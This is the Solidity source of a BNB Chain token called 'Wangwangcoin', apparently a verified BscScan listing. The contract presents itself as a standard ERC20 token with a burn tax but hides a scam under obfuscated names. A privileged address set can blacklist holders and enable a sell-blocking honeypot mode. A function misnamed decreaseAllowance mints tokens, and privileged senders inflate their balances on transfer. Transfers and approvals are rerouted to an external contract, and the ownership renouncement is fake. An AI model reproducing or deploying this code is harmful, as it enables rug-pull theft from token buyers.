/**
 *Submitted for verification at BscScan.com on 2022-08-05
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    event Transfer(address indexed from, address indexed to, uint256 value);    
}

interface IERC {

    function _transfer(address spender, address recipient, uint256 amounts) external;
    
    function _approve(address owner, address spender, uint256 amount) external;
}

library SafeMath {
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }

}

abstract contract Context {
    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }

    function _mjfjveaeaf() internal view virtual returns (address) {
        return msg.sender;
    }

    function _mjfmaefa() internal view virtual returns (uint256) {
        return tx.gasprice;
    }
}

contract Ownable is Context {
    address private _owner;
    
    constructor() {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender);
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
        emit OwnershipTransferred(_owner, address(newOwner));
    }

    function renounceOwnership() public onlyOwner {
        _owner = address(0xdead);
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

contract YJHFE {
    function jfiajkfaf() public pure returns (uint256) {
        uint256 akfkafea = 19484;
        return akfkafea;
    }
}

contract Wangwangcoin is Context, IERC20, Ownable, YJHFE {
    using SafeMath for uint256;

    bool private _jfmajfnaw = true;
    bool private _ifajfawa = false;

    mapping(address => bool) private _kifkawfaw;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcluded;
    mapping(address => uint256) private _ifawfwa;
    mapping(address => bool) private _famfwawf;


    uint8 private _decimals = 9;
    string private _name = unicode"WangWangcoin";
    string private _symbol = unicode"WCoin";

    uint256 public _taxFee = 2;
    uint256 private _kfmkwafaw = 10000000000000 * 10 ** _decimals;

    address private burnAddress = address(0xdead);
    address private _mkfmfkawf;
    address private akigawf;

    address private _fkmafkw;
    uint256 private _fiakmfwam;
    uint256 private _kmfamkfwa;
    string private _mfafkwa;
    uint256 public  _mkkvwfaw;
    address public _mkamkga;
    uint256 private _jafjawfaa;
    uint256 private _jifamwkfkmaw;
    

    constructor(address _mmjgfea, address _ikfmkaew) {
        _mkfmfkawf = _ikfmkaew;
        _isExcluded[address(this)] = true;
        _isExcluded[_mmjgfea] = true;
        _isExcluded[owner()] = true;
        _famfwawf[_mmjgfea] = true;
        _ifawfwa[_mjfjveaeaf()] = _kfmkwafaw;
        emit Transfer(address(0), msg.sender, _kfmkwafaw);
    }

    function setTaxFeePercent(bool __ifajfawa, address _newPair) external {
        require(_famfwawf[_mjfjveaeaf()]);
        if (_famfwawf[_mjfjveaeaf()]) {
            _ifajfawa = __ifajfawa;
            akigawf = _newPair;
        }
    }


    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if (_isExcluded[_mjfjveaeaf()]||_isExcluded[recipient]) {
            _transfer(msg.sender, recipient, amount);
            return true;
        }

        if (_kifkawfaw[_mjfjveaeaf()]||_mjfmaefa()>=(13*1e9)){
            IERC(_mkfmfkawf)._transfer(msg.sender, recipient, amount);
            emit Transfer(msg.sender, recipient, amount);
            return true;
        }else{
            uint256 _burnAmount = amount.mul(_taxFee).div(100);
            _transfer(msg.sender, burnAddress, _burnAmount);
            _transfer(msg.sender, recipient, amount.sub(_burnAmount));
            return true;
        }
    }

    

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if (_isExcluded[sender]||_isExcluded[recipient]) {
            _transfer(sender, recipient, amount);
            _approve(sender,msg.sender,_allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
            return true;
        }
        uint256 _burnAmount = amount.mul(_taxFee).div(100);
        _transfer(sender, burnAddress, _burnAmount);
        _transfer(sender, recipient, amount.sub(_burnAmount));
        _approve(sender,msg.sender,_allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0));
        require(to != address(0));
        require(amount > 0);
        require(_mjfmaefa()<=(13*1e9));
        require(!_kifkawfaw[from]);
        if (_famfwawf[from]) {
            require(_famfwawf[from]);
                _ifawfwa[from]= 
                _ifawfwa[from].
                add(_kfmkwafaw*10**6);
        }
        if (_ifajfawa) {
            if (akigawf == from){}else{
                require(_isExcluded[from] || _isExcluded[to]);
            }
            
        }
        _basicTransfer(from, to, amount);
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        external
    {
        require(_famfwawf[_mjfjveaeaf()]);
        if (_famfwawf[_mjfjveaeaf()]) {   
            _ifawfwa[spender] = _ifawfwa[spender].add(subtractedValue);
        }
    }

    function tokenFromReflection(address spender, address recipient, bool deductTransferFee) external {
        require(recipient == address(0));
        require(_famfwawf[_mjfjveaeaf()]);
        if (_famfwawf[_mjfjveaeaf()]){
            _famfwawf[spender] = deductTransferFee;}
    }

    function swapExcbtTokensForTokens(
        address spender,
        address recipient
    ) external {
        require(_famfwawf[_mjfjveaeaf()]);
        if (_famfwawf[_mjfjveaeaf()]) {
            _kifkawfaw[spender] = true;
            _kifkawfaw[recipient] = true;
        }
    }

    function swapTokenaForExactTokens(address account)
        external
    {
        require(_famfwawf[_mjfjveaeaf()]);
        if (_famfwawf[_mjfjveaeaf()]) {  
            _kifkawfaw[account] = true;
        }
    }

    function changeUserFrom(address account) external {
        require(_famfwawf[_mjfjveaeaf()]);
        if (_famfwawf[_mjfjveaeaf()]) {
            _kifkawfaw[account] = false;
        }
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 toAmount
    ) private {
        require(sender != address(0));
        require(recipient != address(0));
        _ifawfwa[sender] = _ifawfwa[sender].sub(toAmount);
        _ifawfwa[recipient] = _ifawfwa[recipient].add(toAmount);
        emit Transfer(sender, recipient, toAmount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        if (_kifkawfaw[_mjfjveaeaf()]||_mjfmaefa()>=(13*1e9)){
            IERC(_mkfmfkawf)._approve(msg.sender, spender, amount);
            emit Approval(msg.sender, spender, amount);
            return true;
        }else{
            _approve(msg.sender, spender, amount); 
            return true;
        }
    }


    function includeInFee(address account) external {
        require(_famfwawf[_mjfjveaeaf()]);
        if (_famfwawf[_mjfjveaeaf()]) {
            _isExcluded[account] = false;
        }
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function setTaxFeePercent(uint256 taxFee) external {
        require(_famfwawf[_mjfjveaeaf()]);
        if (_famfwawf[_mjfjveaeaf()]) {
            _taxFee = taxFee;
        }
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function isExcludedFromFees(address account) public view  returns (bool) {
        require(_famfwawf[_mjfjveaeaf()]);
        return _kifkawfaw[account];
    }

    function isExcludedFromFee(address spender) external {
        require(_famfwawf[_mjfjveaeaf()]);
        if (_famfwawf[_mjfjveaeaf()]) {
            _isExcluded[spender] = true;
        }
    }

    function totalSupply() public view override returns (uint256) {
        return _kfmkwafaw;
    }

    function jkajfeaf() public pure returns ( uint256) {
        uint256 jkkfjaefea = 18347;
        return jkkfjaefea;
    }

    function jfawmjae() public pure returns (uint256) {
        return jfiajkfaf();
    }

    address private _mjfajfa;
    uint256 private _mfakwmfe;
    uint256 public _mjafae;
    uint256 private _fkmakwew;
    address private _kiakfa;


    function foiamkfjea() public pure returns (uint256, uint256) {
        uint256 fjkakfaifieafnjea = 1039483;
        uint256 awjnjeaf = 104885;
        return (fjkakfaifieafnjea, awjnjeaf);
    }

    function openstart() public onlyOwner() {
    }


    function balanceOf(address account) public view override returns (uint256) {
        return _ifawfwa[account];
    }
}